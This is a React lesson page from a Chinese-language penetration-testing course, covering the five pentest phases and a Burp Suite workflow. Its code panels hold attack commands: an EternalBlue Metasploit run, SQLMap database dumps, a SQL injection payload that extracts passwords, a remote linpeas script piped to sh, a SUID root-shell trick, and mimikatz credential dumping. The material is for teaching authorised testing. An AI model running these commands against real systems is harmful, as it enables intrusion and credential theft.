import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LessonCommon.css';

const PENTEST_PHASES = [
  {
    phase: '1. 信息收集', icon: '🔍', color: '#38bdf8',
    tools: ['WHOIS / DNS 查询', 'subfinder（子域名）', 'Shodan（互联网扫描引擎）', 'theHarvester（邮件/人员信息）', 'Wayback Machine（历史页面）'],
    code: `# 被动信息收集（不直接接触目标）
whois example.com                          # 注册人/联系方式
dig example.com ANY                        # DNS 所有记录
subfinder -d example.com -silent           # 子域名枚举
theHarvester -d example.com -b all        # 邮件/姓名/IP

# Shodan 搜索（发现暴露的服务）
shodan search "org:example.com" --fields ip_str,port,product
# 主动信息收集（会被目标察觉）
nmap -sV -sC -p 80,443,22,3306 example.com   # 服务版本探测
nmap --script http-enum example.com           # HTTP 目录枚举
gobuster dir -u https://example.com -w wordlist.txt`,
  },
  {
    phase: '2. 漏洞扫描', icon: '🎯', color: '#fbbf24',
    tools: ['Nmap NSE 漏洞脚本', 'Nikto（Web 服务器扫描）', 'OpenVAS（网络漏洞扫描）', 'Nuclei（模板化漏洞扫描）', 'Burp Suite（Web 代理）'],
    code: `# Nmap 漏洞扫描
nmap --script vuln -p 80,443,22 192.168.1.100
nmap --script=smb-vuln* 192.168.1.100    # SMB 漏洞（EternalBlue等）

# Nikto：Web 服务器专项扫描
nikto -h https://192.168.1.100 -ssl

# Nuclei：高效模板化扫描
nuclei -u https://192.168.1.100 -t cves/ -t exposures/
nuclei -u https://192.168.1.100 -severity critical,high

# Burp Suite：手工测试（代理配置）
# Firefox -> Network Settings -> 127.0.0.1:8080
# Burp Proxy -> Intercept ON -> 抓包修改重放`,
  },
  {
    phase: '3. 漏洞利用', icon: '💣', color: '#f87171',
    tools: ['Metasploit Framework', 'Exploit-DB（CVE查询）', 'SQLMap（SQL注入自动化）', 'Burp Repeater（手工重放）', '自定义 Python exploit'],
    code: `# Metasploit 基本使用
msfconsole
msf> search ms17-010         # EternalBlue（SMB RCE）
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS 192.168.1.100
msf> set LHOST 192.168.1.50  # 攻击者IP
msf> run

# SQLMap 自动化（仅限授权目标）
sqlmap -u "http://target.com/user?id=1" \\
  --dbs \\          # 枚举数据库
  --tables \\       # 枚举表
  --dump \\         # 导出数据
  --batch           # 自动确认

# 自定义 exploit（Python）
import requests
payload = "' UNION SELECT username,password FROM users--"
r = requests.get(f"http://target.com/search?q={payload}")`,
  },
  {
    phase: '4. 提权横移', icon: '🔑', color: '#a78bfa',
    tools: ['LinPEAS / WinPEAS', 'GTFOBins（Linux提权）', 'BloodHound（AD分析）', 'Mimikatz（凭证提取）', 'PowerSploit'],
    code: `# Linux 本地提权检查
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 手动检查提权面
sudo -l                    # 当前用户可以 sudo 执行什么
find / -perm -4000 2>/dev/null  # SUID 文件（可以提权）
cat /etc/crontab           # 可利用的计划任务
env | grep -i pass         # 环境变量中的密码

# GTFOBins：利用 SUID 的 find 提权
sudo find . -exec /bin/sh \\; -quit   # 获得 root shell

# Windows AD 横向移动（仅授权环境）
mimikatz # sekurlsa::logonpasswords   # 提取内存凭证
psexec \\\\192.168.1.105 -u admin -p password cmd`,
  },
  {
    phase: '5. 报告输出', icon: '📋', color: '#22c55e',
    tools: ['漏洞评级（CVSS 3.1）', '风险矩阵（可能性×影响）', '复现步骤文档', '补救建议优先级', 'TLP 报告分级'],
    code: `# 渗透测试报告结构
# ================================
# 执行摘要（Executive Summary）
# ================================
# 测试周期：2024-01-15 ~ 2024-01-25
# 授权范围：192.168.1.0/24, web.example.com
# 严重漏洞：3个  高危：7个  中危：12个

# 漏洞详情模板：
---
漏洞名称：SQL 注入（A03:2021）
CVSS 3.1 评分：9.8（CRITICAL）
影响范围：/api/login 接口
复现步骤：
  1. 访问 POST /api/login
  2. username 字段输入：admin' --
  3. 无需密码即可以 admin 身份登录

修复建议（优先级：立即修复）：
  - 改用参数化查询
  - 实施输入验证白名单
  - 审计所有数据库查询语句`,
  },
];

const BURP_WORKFLOW = [
  { step: '配置代理', desc: 'Firefox 设置 HTTP 代理 127.0.0.1:8080，安装 Burp CA 证书' },
  { step: '拦截请求', desc: 'Proxy → Intercept ON，浏览目标网站，所有请求被拦截' },
  { step: '发现参数', desc: '在 HTTP 历史中找到含用户输入的请求（登录/搜索/API）' },
  { step: 'Repeater 重放', desc: '右键 → Send to Repeater，手动修改参数值，测试注入/越权' },
  { step: 'Intruder 爆破', desc: '标记 Payload 位置，加载 wordlist，自动测试所有变体' },
  { step: 'Scanner 扫描', desc: '（Pro版）右键 → Scan，Burp 主动扫描所有参数的常见漏洞' },
];

export default function LessonRecon() {
  const navigate = useNavigate();
  const [activePhase, setActivePhase] = useState(0);
  const [activeBurp, setActiveBurp] = useState(null);

  const p = PENTEST_PHASES[activePhase];

  return (
    <div className="lesson-sec">
      <div className="sec-badge orange">🔍 module_05 — 渗透流程</div>
      <div className="sec-disclaimer">⚠️ 所有工具和技术仅可在授权目标上使用（CTF/靶机/书面授权）。</div>

      <div className="sec-hero">
        <h1>侦察与渗透流程：Kali / Burp Suite 实战</h1>
        <p>专业渗透测试遵循严格的方法论：<strong>侦察 → 扫描 → 利用 → 提权 → 报告</strong>，每个阶段有对应工具和输出文档。本模块覆盖完整 Pentest Workflow。</p>
      </div>

      {/* 五阶段流程 */}
      <div className="sec-section">
        <h2 className="sec-section-title">🗺️ 渗透测试五阶段（点击查看工具+命令）</h2>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.4rem', marginBottom: '1rem' }}>
          {PENTEST_PHASES.map((ph, i) => (
            <button key={i} onClick={() => setActivePhase(i)}
              style={{ flex: 1, minWidth: 130, padding: '0.75rem 0.5rem', borderRadius: '9px', cursor: 'pointer', textAlign: 'center', fontWeight: 700, fontSize: '0.82rem', transition: 'all 0.2s',
                border: `1px solid ${activePhase === i ? ph.color + '60' : 'rgba(255,255,255,0.07)'}`,
                background: activePhase === i ? `${ph.color}10` : 'rgba(255,255,255,0.02)',
                color: activePhase === i ? ph.color : '#5a1a1a' }}>
              <div style={{ fontSize: '1.2rem', marginBottom: '0.15rem' }}>{ph.icon}</div>
              {ph.phase}
            </button>
          ))}
        </div>

        {/* 工具列表 */}
        <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', marginBottom: '0.75rem' }}>
          {p.tools.map(tool => (
            <span key={tool} className="sec-tag" style={{ background: `${p.color}12`, color: p.color }}>{tool}</span>
          ))}
        </div>

        <div className="sec-terminal">
          <div className="sec-terminal-header">
            <div className="sec-terminal-dot" style={{ background: '#ef4444' }} />
            <div className="sec-terminal-dot" style={{ background: '#f59e0b' }} />
            <div className="sec-terminal-dot" style={{ background: '#22c55e' }} />
            <span style={{ marginLeft: '0.5rem', color: p.color }}>{p.icon} {p.phase}</span>
          </div>
          <div className="sec-terminal-body" style={{ fontSize: '0.75rem' }}>{p.code}</div>
        </div>
      </div>

      {/* Burp Suite 工作流 */}
      <div className="sec-section">
        <h2 className="sec-section-title">🕵️ Burp Suite 6步工作流（必备技能）</h2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.35rem' }}>
          {BURP_WORKFLOW.map((step, i) => (
            <div key={i} onClick={() => setActiveBurp(activeBurp === i ? null : i)}
              style={{ display: 'flex', gap: '0.75rem', padding: '0.75rem 1rem', borderRadius: '8px', cursor: 'pointer', alignItems: 'flex-start', transition: 'all 0.15s',
                border: `1px solid ${activeBurp === i ? 'rgba(249,115,22,0.4)' : 'rgba(255,255,255,0.05)'}`,
                background: activeBurp === i ? 'rgba(249,115,22,0.08)' : 'rgba(255,255,255,0.02)' }}>
              <span style={{ width: 24, height: 24, borderRadius: '50%', background: 'rgba(249,115,22,0.15)', color: '#f97316', fontSize: '0.7rem', fontWeight: 900, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>{i + 1}</span>
              <div>
                <div style={{ fontWeight: 700, color: activeBurp === i ? '#f97316' : '#f0d0d0', fontSize: '0.85rem' }}>{step.step}</div>
                {activeBurp === i && <div style={{ fontSize: '0.78rem', color: '#5a1a1a', marginTop: '0.2rem' }}>{step.desc}</div>}
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="sec-nav">
        <button className="sec-btn" onClick={() => navigate('/course/security-pentest/lesson/xss-csrf')}>← 上一模块</button>
        <button className="sec-btn attack" onClick={() => navigate('/course/security-pentest/lesson/privesc')}>下一模块：权限提升 →</button>
      </div>
    </div>
  );
}
